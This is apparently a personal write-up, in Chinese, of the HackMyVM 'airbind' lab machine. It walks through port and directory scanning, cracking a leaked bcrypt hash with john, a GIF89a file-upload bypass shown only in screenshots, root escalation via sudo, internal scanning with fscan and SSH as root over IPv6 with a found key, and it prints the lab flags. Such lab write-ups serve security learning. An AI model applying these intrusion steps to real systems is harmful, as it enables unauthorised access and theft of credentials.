---
title: HMV_airbind
tags:
  - sec
date: 2024-06-15T11:46:25
lastmod: 2025-09-29T20:51:45
toc: "true"
---

## 端口扫描
```shell
~ ➤ nmap -Pn -sT 192.168.124.210 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-14 23:47 EDT
Nmap scan report for 192.168.124.210
Host is up (0.0047s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE    SERVICE
22/tcp filtered ssh
80/tcp open     http

Nmap done: 1 IP address (1 host up) scanned in 7.38 seconds
```

22端口是filtered...没注意这个细节
![HMV_airbind_image_1](https://img.l1uyun.one/HMV_airbind_image_1.png)

## web_80

### 目录扫描
扫目录扫出来,状态不太行,应该先判断一下优先查看哪些目录
```shell
/images               (Status: 301) [Size: 319] [--> http://192.168.124.210/images/]   
/.php                 (Status: 403) [Size: 280]
/about.php            (Status: 302) [Size: 0] [--> login.php]
/login.php            (Status: 200) [Size: 1924]
/logos.php            (Status: 200) [Size: 1977]
/stats.php            (Status: 302) [Size: 0] [--> login.php]
/index.php            (Status: 302) [Size: 0] [--> login.php]
/.html                (Status: 403) [Size: 280]
/screenshots          (Status: 301) [Size: 324] [--> http://192.168.124.210/screenshots/]
/scripts              (Status: 301) [Size: 320] [--> http://192.168.124.210/scripts/]  
/registration.php     (Status: 302) [Size: 0] [--> login.php]
/includes             (Status: 301) [Size: 321] [--> http://192.168.124.210/includes/] 
/db                   (Status: 301) [Size: 315] [--> http://192.168.124.210/db/]       
/logout.php           (Status: 302) [Size: 0] [--> .]
/styles               (Status: 301) [Size: 319] [--> http://192.168.124.210/styles/]   
/settings.php         (Status: 302) [Size: 0] [--> login.php]
/auth.php             (Status: 200) [Size: 0]
```
### db文件泄露
在db目录下找到一个sqlite的转储文件,使用在线工具解析一下,发现user
![HMV_airbind_image_2](https://img.l1uyun.one/HMV_airbind_image_2.png)

```bash
admin@localhost.com
$2y$10$2XxuEupev6gU1qWoURsIYu7XHNiy7nve9iq7H0mUX/MzFnmvbxC9S


~ ➤ john hhh
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
admin            (?)     
1g 0:00:00:29 DONE 2/3 (2024-06-14 23:58) 0.03439g/s 99.07p/s 99.07c/s 99.07C/s Smokey..buzz
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```


.....admin,admin弱口令是吧
### GIF89a,文件上传
![HMV_airbind_image_3](https://img.l1uyun.one/HMV_airbind_image_3.png)

![HMV_airbind_image_4](https://img.l1uyun.one/HMV_airbind_image_4.png)

## root1

还是得用原生的终端,tabby又出现卡死了
![HMV_airbind_image_5](https://img.l1uyun.one/HMV_airbind_image_5.png)
进去之后sudo -l,nopasswd/all
### user.txt
应该又是docker环境了
```bash
root@ubuntu:/# find / -type f -name "user.txt" 2>/dev/null
/root/user.txt
root@ubuntu:/# cat /root/user.txt
4408f370877687429c6ab332e6f560d0
```
### 枚举
```bash
root@ubuntu:/# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether dc:a1:f7:82:76:13 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.0.3.241/24 brd 10.0.3.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::dea1:f7ff:fe82:7613/64 scope link
       valid_lft forever preferred_lft forever
3: wlan0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
6: ap0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 42:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
```


体验上还是tabby好一点

```shell
root@ubuntu:/tmp# ./fscan64 -h 10.0.3.241/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.3
start infoscan
(icmp) Target 10.0.3.1        is alive
(icmp) Target 10.0.3.241      is alive
[*] Icmp alive hosts len is: 2
10.0.3.241:80 open
[*] alive ports len is: 1
start vulscan
[*] WebTitle http://10.0.3.241         code:302 len:0      title:None 跳转url: http://10.0.3.241/login.php
[*] WebTitle http://10.0.3.241/login.php code:200 len:1924   title:Wallos - Subscription Tracker
已完成 1/1
[*] 扫描结束,耗时: 7.077390677s
root@ubuntu:/tmp#
```
## id_rsa+ipv6访问
好吧,看了一下群主的wp,原来是ipv6
进去之后得到id_rsa,然后使用ipv6地址来ssh连接

.....四个ipv6地址,尝试了三次都没中...
```shell
	➜  workspace  ssh -i id_rsa root@fe80::a00:27ff:fe85:25f9%eth5
Linux airbind 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@airbind:~# cat root.txt
2bd693135712f88726c22770278a2dcf
root@airbind:~#
```
## l1uyun
第一次接触涉及ipv6的靶场......
刚刚思路已经到了尝试id_rsa,但是没有想到是得用ipv6..
fscan的时候是扫描出来了一些ipv6地址..但是我没有往这个方向去想...

